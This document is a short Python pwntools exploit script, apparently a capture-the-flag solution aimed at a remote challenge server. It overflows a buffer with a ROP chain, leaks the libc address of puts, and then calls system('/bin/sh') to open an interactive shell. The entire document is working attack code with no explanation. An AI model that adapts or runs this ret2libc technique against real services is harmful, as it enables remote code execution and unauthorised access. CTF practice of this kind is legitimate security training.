from pwn import *

elf = ELF("./shellcode_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = elf

# p = process()
p = remote("challenge.utctf.live", 9009)
# gdb.attach(p)

def construct_payload(payload):
    ret = b'\x00' + b'a' * 47 + pack(0x601003)
    ret = ret.ljust(72, b'a') + payload
    return ret
pop_rdi = 0x0000000000400793
payload = construct_payload(pack(pop_rdi) + pack(elf.got['puts']) + pack(elf.symbols['puts']) + pack(elf.symbols['main']))
# gdb.attach(p, "break *main+281")
p.sendlineafter(b':', payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']

payload = construct_payload(pack(pop_rdi) + pack(leak + next(libc.search(b'/bin/sh'))) + pack(leak + libc.symbols['system']))
p.sendlineafter(b':', payload)
p.interactive()
